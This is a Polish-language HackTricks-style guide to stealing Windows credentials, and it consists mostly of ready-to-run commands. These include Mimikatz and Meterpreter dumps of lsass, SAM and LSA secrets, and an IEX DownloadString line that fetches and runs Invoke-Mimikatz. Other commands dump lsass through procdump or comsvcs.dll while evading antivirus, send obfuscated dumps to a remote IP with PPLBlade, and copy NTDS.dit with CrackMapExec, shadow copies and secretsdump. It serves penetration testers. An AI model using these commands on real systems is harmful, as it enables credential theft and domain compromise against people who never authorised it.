# Kradzież poświadczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Poświadczenia Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz może zrobić na** [**tej stronie**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Dowiedz się o możliwych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą zapobiec wydobywaniu niektórych poświadczeń przez Mimikatz.**

## Poświadczenia z Meterpreter

Użyj [**Wtyczki Poświadczeń**](https://github.com/carlospolop/MSF-Credentials) **którą** stworzyłem, aby **wyszukiwać hasła i hasze** wewnątrz ofiary.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Obejście AV

### Procdump + Mimikatz

As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoftu**, nie jest wykrywany przez Defendera.\
Możesz użyć tego narzędzia do **zrzutu procesu lsass**, **pobrania zrzutu** i **wyodrębnienia** **poświadczeń lokalnie** z zrzutu.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ten proces jest realizowany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre **AV** mogą **wykrywać** użycie **procdump.exe do zrzutu lsass.exe** jako **złośliwe**, ponieważ **wykrywają** ciąg **"procdump.exe" i "lsass.exe"**. Dlatego **cichsze** jest **przekazanie** jako **argumentu** **PID** lsass.exe do procdump **zamiast** nazwy lsass.exe.

### Zrzut lsass za pomocą **comsvcs.dll**

DLL o nazwie **comsvcs.dll** znajdujący się w `C:\Windows\System32` jest odpowiedzialny za **zrzut pamięci procesu** w przypadku awarii. Ten DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, zaprojektowaną do wywoływania za pomocą `rundll32.exe`.\
Nie ma znaczenia użycie pierwszych dwóch argumentów, ale trzeci jest podzielony na trzy komponenty. Identyfikator procesu do zrzutu stanowi pierwszy komponent, lokalizacja pliku zrzutu reprezentuje drugi, a trzeci komponent to ściśle słowo **full**. Nie ma alternatywnych opcji.\
Po przetworzeniu tych trzech komponentów, DLL angażuje się w tworzenie pliku zrzutu i przenoszenie pamięci określonego procesu do tego pliku.\
Wykorzystanie **comsvcs.dll** jest możliwe do zrzutu procesu lsass, eliminując potrzebę przesyłania i uruchamiania procdump. Ta metoda jest opisana szczegółowo na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Następujące polecenie jest używane do wykonania:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Możesz zautomatyzować ten proces za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzut lsass za pomocą Menedżera zadań**

1. Kliknij prawym przyciskiem myszy na pasku zadań i wybierz Menedżera zadań
2. Kliknij na Więcej szczegółów
3. Wyszukaj proces "Local Security Authority Process" w zakładce Procesy
4. Kliknij prawym przyciskiem myszy na proces "Local Security Authority Process" i wybierz "Utwórz plik zrzutu".

### Zrzut lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to podpisany przez Microsoft plik binarny, który jest częścią zestawu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass z PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do zrzutu chronionych procesów, które wspiera obfuscację zrzutów pamięci i ich transfer na zdalne stacje robocze bez zapisywania ich na dysku.

**Kluczowe funkcjonalności**:

1. Obejście ochrony PPL
2. Obfuscacja plików zrzutów pamięci w celu unikania mechanizmów wykrywania opartych na sygnaturach Defendera
3. Przesyłanie zrzutu pamięci metodami RAW i SMB bez zapisywania go na dysku (zrzut bezplikowy)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### Zrzut hashy SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Zrzut sekretów LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Zrzut NTDS.dit z docelowego DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Zrzut historii haseł NTDS.dit z docelowego DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Pokaż atrybut pwdLastSet dla każdego konta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kradzież SAM i SYSTEM

Te pliki powinny być **znajdowane** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ale **nie możesz ich po prostu skopiować w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najłatwiejszym sposobem na kradzież tych plików jest uzyskanie kopii z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashe** za pomocą:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Możesz wykonać kopię chronionych plików za pomocą tej usługi. Musisz być administratorem.

#### Using vssadmin

Binarna wersja vssadmin jest dostępna tylko w wersjach Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ale możesz to zrobić również za pomocą **Powershell**. Oto przykład **jak skopiować plik SAM** (używany dysk twardy to "C:", a plik jest zapisywany w C:\users\Public), ale możesz to wykorzystać do kopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na koniec możesz również użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby skopiować SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Kredencje Active Directory - NTDS.dit**

Plik **NTDS.dit** jest znany jako serce **Active Directory**, przechowując kluczowe dane o obiektach użytkowników, grupach i ich członkostwie. To tutaj przechowywane są **hashe haseł** dla użytkowników domeny. Plik ten jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych utrzymywane są trzy główne tabele:

- **Tabela danych**: Ta tabela jest odpowiedzialna za przechowywanie szczegółów o obiektach, takich jak użytkownicy i grupy.
- **Tabela linków**: Śledzi relacje, takie jak członkostwo w grupach.
- **Tabela SD**: **Deskryptory zabezpieczeń** dla każdego obiektu są przechowywane tutaj, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

Więcej informacji na ten temat: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a jest on używany przez _lsass.exe_. Część pliku **NTDS.dit** może być zlokalizowana **w pamięci `lsass`** (możesz znaleźć ostatnio dostępne dane prawdopodobnie z powodu poprawy wydajności dzięki użyciu **cache**).

#### Deszyfrowanie hashy wewnątrz NTDS.dit

Hash jest szyfrowany 3 razy:

1. Deszyfruj Klucz Szyfrowania Hasła (**PEK**) używając **BOOTKEY** i **RC4**.
2. Deszyfruj **hash** używając **PEK** i **RC4**.
3. Deszyfruj **hash** używając **DES**.

**PEK** ma **tę samą wartość** w **każdym kontrolerze domeny**, ale jest **szyfrowany** wewnątrz pliku **NTDS.dit** używając **BOOTKEY** pliku **SYSTEM kontrolera domeny (jest inny między kontrolerami domeny)**. Dlatego, aby uzyskać kredencje z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiowanie NTDS.dit za pomocą Ntdsutil

Dostępne od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz również użyć triku z [**kopią cienia woluminu**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**zrzutuj go z rejestru lub użyj triku z kopią cienia woluminu**](#stealing-sam-and-system)).

### **Ekstrakcja hashy z NTDS.dit**

Gdy już **zdobędziesz** pliki **NTDS.dit** i **SYSTEM**, możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashe**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz również **wyodrębnić je automatycznie** używając ważnego użytkownika z uprawnieniami administratora domeny:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Dla **dużych plików NTDS.dit** zaleca się ich ekstrakcję za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na koniec można również użyć **modułu metasploit**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Ekstrakcja obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale także całe obiekty i ich atrybuty w celu dalszej ekstrakcji informacji, gdy surowy plik NTDS.dit został już pobrany.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive jest opcjonalny, ale pozwala na deszyfrowanie sekretów (hasła NT i LM, dodatkowe poświadczenia, takie jak hasła w postaci czystego tekstu, klucze kerberos lub zaufania, historie haseł NT i LM). Wraz z innymi informacjami, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich hashami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwa rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typem zaufania, kierunkiem i atrybutami...

## Lazagne

Pobierz binarkę z [tutaj](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tej binarki do wyodrębnienia poświadczeń z kilku programów.
```
lazagne.exe all
```
## Inne narzędzia do wyodrębniania poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie może być używane do wyodrębniania poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyodrębnij poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnij dane uwierzytelniające z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pobierz go z: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **wykonaj go**, a hasła zostaną wyodrębnione.

## Defenses

[**Dowiedz się o niektórych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md)

{{#include ../../banners/hacktricks-training.md}}
